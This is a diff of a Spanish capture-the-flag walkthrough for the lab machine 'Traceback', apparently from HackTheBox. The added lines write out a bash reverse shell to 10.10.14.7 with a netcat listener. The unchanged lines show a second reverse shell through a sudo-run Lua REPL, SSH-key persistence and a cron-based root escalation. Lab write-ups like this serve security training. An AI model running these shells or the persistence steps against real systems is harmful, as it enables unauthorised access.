@@ -51,11 +51,12 @@ Frase de error por intentos, ej 'Blacklist protection' >  test
 [*] La contraseña para [admin] es [admin]
 ```
 Tengo que avisar que  mi rockyuu (el diccionario que usa por defecto) esta ligeramente modificado. (ej la 
-contraeña admin va mucho antes)
+contraeña admin va mucho antes). Hay una linea para poner comandos a ejecutar en el sistema.
 
-Pongo el comando de la reverse shell.
+Pongo el comando de la reverse shell y con netcat a la escucha en el puerto 443 ```bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'```
+Entro al sistema.
 
-Enumeracion con mi script:
+Enumeracion con mi [script](https://github.com/CUCUxii/Lin_info_xii.sh)
 - Estamos con el usuario "webadmin"
 - No hay capabilities ni SUIDS importantes
 - Puedo ejecutar este script como root sin dar contraseña "/home/sysadmin/luvit"
@@ -75,7 +76,7 @@ I have left a tool to practice Lua.
 I'm sure you know where to find it.
 Contact me if you have any question.
 ```
-
+Con Lua la manera de meter comandos al sistema es entablarse una bash:
 ```console
 webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit
 Welcome to the Luvit repl!
@@ -84,7 +85,7 @@ $ whoami
 sysadmin
 $ bash -c 'bash -i >& /dev/tcp/10.10.14.7/444 0>&1'
 ```
-Entre al sistema con ```nc -nlvp 444```. Tambien puse mi llave en su authorized keys:
+Entre al sistema con ```nc -nlvp 444```. Tambien puse mi llave en su authorized keys para entrar por ssh.
 ```
 sysadmin@traceback:~/.ssh$ nano authorized_keys
 sysadmin@traceback:~/.ssh$ cat authorized_keys
@@ -97,7 +98,7 @@ root        430  0.0  0.0  31320  3252 ?        Ss   09:32   0:00 /usr/sbin/cron
 root       1381  0.0  0.0  58792  3216 ?        S    09:56   0:00  \_ /usr/sbin/CRON -f
 root       1384  0.0  0.0   4628   804 ?        Ss   09:56   0:00      \_ /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
 ```
-Es decir hacen una copia del archivo *update_motd.d* en /var/backups
+Es decir hacen una copia del archivo *update_motd.d* en /var/backups cada 30 segundos (y supongo que tambien ejecutarlo)
 
 ```console
 sysadmin@traceback:/etc/cron.d$ cd /etc/update-motd.d/
